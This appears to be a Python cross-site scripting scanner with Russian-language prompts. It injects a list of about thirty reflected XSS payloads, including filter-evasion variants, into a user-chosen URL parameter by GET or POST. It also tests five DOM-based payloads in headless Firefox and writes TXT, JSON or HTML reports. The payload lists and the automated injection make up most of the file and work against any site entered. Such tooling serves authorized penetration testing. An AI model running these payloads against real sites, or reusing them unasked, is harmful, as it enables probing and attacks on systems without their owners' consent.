import datetime
import urllib.parse
import requests
import html
import json
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import webbrowser

resultjson = []

result = f"xss_result_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}"

dom_payload = [
    "#<img src=x onerror=alert(1337)>",
    "#<svg onload=alert(1337)>",
    "#<body onload=alert(1337)>",
    "?q=<script>alert(1337)</script>",
    "#<iframe src='javascript:alert(1337)'>"
]

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<image/src/onerror=prompt(8)>",
    "<img/src/onerror=prompt(8)>",
    "<image src/onerror=prompt(8)>",
    "<img src/onerror=prompt(8)>",
    "<image src =q onerror=prompt(8)>",
    "<img src =q onerror=prompt(8)>",
    "</scrip</script>t><img src =q onerror=prompt(8)>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<input onfocus=alert(1) autofocus>",
    "<video><source onerror='alert(1)'></video>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<math><mtext><img src=x onerror=alert(1)></mtext></math>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)//<</script>",
    "<script/src=data:text/javascript,alert(1)>",
    "<svg><script xlink:href=data:,alert(1)></script></svg>",
    "<img ''='' onerror=alert(1)>",
    "<img src=x:alert(1) onerror=eval(src)>",
    "<a href=JaVaScRiPt:alert(1)>click</a>",
    "<script>/*--><script>alert(1)//--></script>",
    "<script>eval('alert(1)')</script>",
    "<script>prompt(1337)</script>",
    "<script>confirm('XSS')</script>",
    "<img src=1 onerror=eval('alert(1)')>",
    "<script>Function('alert(1)')()</script>"
]

def vibor():
    print("\nВыбери формат сохранения результата\n1-TXT\n2-JSON\n3-HTML")
    choice = input(": ").strip()
    return choice

def test_dom_xss(base_url, dom_payloads, resultjson):
    print("\nПроверка на DOM-based XSS (Selenium):")
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    for payload in dom_payloads:
        try:
            full_url = base_url + payload
            driver.get(full_url)
            alert = False
            try:
                alert_obj = driver.switch_to.alert
                alert_obj.accept()
                alert = True
            except:
                pass

            print(f"{'сработал' if alert else 'не сработал'} {payload}")

            result_entry = {
                "payload": payload,
                "worked": alert,
                "url": full_url,
                "status_code": "N/A (DOM)"
            }
            resultjson.append(result_entry)

        except Exception as e:
            print(f"ошибка DOM XSS: {e}")

    driver.quit()

save_format = vibor()

method = input("Выбери метод запроса (GET или POST): ").strip().upper()
if method not in ["GET", "POST"]:
    print("Неверный метод. По умолчанию используется GET.")
    method = "GET"

headers = {
    "User-Agent": "Mozilla/5.0 (VenturaCounty; Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89"
}

url = input("Введите url (например, https://example.com): ").strip()
def get_param():
    print("\n1 - Ввести имя параметра вручную")
    print("2 - Выбрать из популярных имён параметров")
    choice = input("Выбор: ").strip()

    if choice == "2":
        preset_params = ["q", "search", "query", "s", "input"]
        for i, p in enumerate(preset_params, 1):
            print(f"{i}: {p}")
        try:
            idx = int(input("Выбери номер: ").strip())
            return preset_params[idx - 1]
        except (ValueError, IndexError):
            print("Неверный выбор, будет 'q' по умолчанию.")
            return "q"
    else:
        return input("Введите имя параметра (например, q): ").strip()

param = get_param()

print("\nПроверка на XSS")

for payload in payloads:
    try:
        if method == "POST":
            test_url = url
            response = requests.post(test_url, headers=headers, data={param: payload})
        else:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?{param}={encoded_payload}"
            response = requests.get(test_url, headers=headers)

        worked = payload in response.text
        print(f"{'сработал' if worked else 'не сработал'} {payload}")

        result_entry = {
            "payload": payload,
            "worked": worked,
            "url": test_url,
            "status_code": response.status_code
        }
        resultjson.append(result_entry)

    except Exception as e:
        print(f"ошибка {e}")

test_dom_xss(url, dom_payload, resultjson)

if save_format == "1":
    with open(f"{result}.txt", "w", encoding="utf-8") as f:
        for entry in resultjson:
            f.write(f"{'сработал' if entry['worked'] else 'не сработал'} {entry['payload']}\n")

elif save_format == "2":
    with open(f"{result}.json", "w", encoding="utf-8") as jf:
        json.dump(resultjson, jf, ensure_ascii=False, indent=4)

elif save_format == "3":
    html_content = """
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <title>Результаты XSS</title>
            <style>
                body { font-family: sans-serif; background: #f9f9f9; padding: 20px; }
                table { border-collapse: collapse; width: 100%; background: white; }
                th, td { border: 1px solid #ddd; padding: 8px; }
                th { background: #222; color: white; }
                tr:nth-child(even) { background: #f2f2f2; }
                code { color: #c7254e; background: #f9f2f4; padding: 2px 4px; border-radius: 4px; }
            </style>
        </head>
        <body>
            <h1>Результаты XSS</h1>
            <table>
                <tr>
                    <th>Payload</th>
                    <th>URL</th>
                    <th>Сработал?</th>
                    <th>Status Code</th>
                </tr>
    """

    for entry in resultjson:
        safe_payload = html.escape(entry["payload"])
        safe_url = html.escape(entry["url"])
        html_content += f"""
                <tr>
                    <td><code>{safe_payload}</code></td>
                    <td><a href="{safe_url}">{safe_url}</a></td>
                    <td>{"Да" if entry["worked"] else "Нет"}</td>
                    <td>{entry["status_code"]}</td>
                </tr>
        """

    html_content += """
            </table>
        </body>
        </html>
    """

    browser = input("Хотите сразу открыть HTML-отчёт в браузере? (y/n): ")

    if browser == "y":
        webbrowser.open(f"{result}.html")

    with open(f"{result}.html", "w", encoding="utf-8") as hf:
        hf.write(html_content)
